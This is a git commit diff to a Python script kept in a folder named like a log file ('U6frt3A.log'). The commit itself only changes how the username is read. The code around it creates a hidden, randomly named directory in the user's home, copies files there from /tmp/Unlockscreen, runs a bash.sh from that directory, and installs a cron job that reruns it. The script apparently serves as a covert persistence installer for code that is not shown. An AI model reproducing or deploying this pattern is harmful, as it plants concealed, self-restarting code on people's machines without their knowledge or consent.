0952ff2af5a2ab1546166dd73a1c1cf60a9132c2
HardImpostor <103056913+HardImpostor@users.noreply.github.com>
2022-10-18 14:05:56 +0200

    Update script.py

--- U6frt3A.log/script.py
+++ U6frt3A.log/script.py
@@ -4,7 +4,7 @@ os.system('mkdir $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98'
 os.system('cp -r /tmp/Unlockscreen/U6frt3A.log $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98' )
 os.system('bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh')
 from crontab import CronTab
-user=os.system('echo $LOGNAME')
+user=os.environ["LOGNAME"]
 print("voici\n",user,'fin')
 cron = CronTab(user=user)
 job = cron.new(command='bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh')
